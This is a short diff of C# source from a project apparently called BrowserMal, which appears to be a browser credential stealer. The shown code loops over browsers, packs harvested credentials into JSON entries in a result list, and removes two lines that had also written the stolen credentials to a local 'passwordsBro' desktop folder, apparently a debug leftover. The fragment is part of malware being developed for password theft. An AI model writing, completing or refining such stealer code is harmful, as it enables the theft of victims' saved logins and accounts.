@@ -38,7 +38,6 @@ namespace BrowserMal.Manager
 
                     string rand = Path.GetRandomFileName();
                     _resultList.Add($"{browser.Name}_{_tableName}_{rand}.json", JsonUtil.GetJson<T>(creds));
-                    Filesaver.FileManager.Save<T>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{_tableName}_{rand}.json");
                     
                     continue;
                 }
@@ -49,7 +48,6 @@ namespace BrowserMal.Manager
                     continue;
 
                 _resultList.Add($"{browser.Name}_{_tableName.Replace(".json", "")}.json", JsonUtil.GetJson<T>(creds));
-                Filesaver.FileManager.Save<T>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{_tableName.Replace(".json", "")}.json");
             }
 
             return _resultList;
